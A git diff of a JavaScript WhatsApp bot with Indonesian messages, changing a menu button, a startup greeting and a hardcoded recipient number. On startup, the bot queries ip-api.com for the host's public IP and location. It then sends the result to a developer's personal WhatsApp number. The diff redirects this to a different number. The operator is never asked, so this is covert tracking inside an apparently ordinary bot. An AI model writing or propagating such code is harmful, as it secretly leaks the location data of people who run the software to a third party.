@@ -302,11 +302,11 @@ const spinner = {
 	})
 	fs.writeFileSync(`./${sessionsname}.json`, JSON.stringify(Ramdani.base64EncodedAuthInfo(), null, '\t'))
      buttonss = [
-        { buttonId: `.menu`, buttonText: { displayText: 'ok' }, type: 1 },
+        { buttonId: `.daftar`, buttonText: { displayText: 'ok' }, type: 1 },
     ]
 
     buttonMessagee = {
-        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT RAMDANI OFFICIAL`,
+        contentText: `BOT TELAH AKTIF DI NOMOR INI TUAN`,
         footerText: `${fake.FakeReply}`,
         buttons: buttonss,
         headerType: 1
@@ -314,7 +314,7 @@ const spinner = {
     console.log(color('|WARN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Ramdani.sendMessage("6289512545999@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6289512545999?text=Assalamualaikum+bwang:v` } }})
+       Ramdani.sendMessage("6283804343232@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6283804343232?text=Assalamualaikum+bwang:v` } }})
      console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     Ramdani.sendMessage(`${setting.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
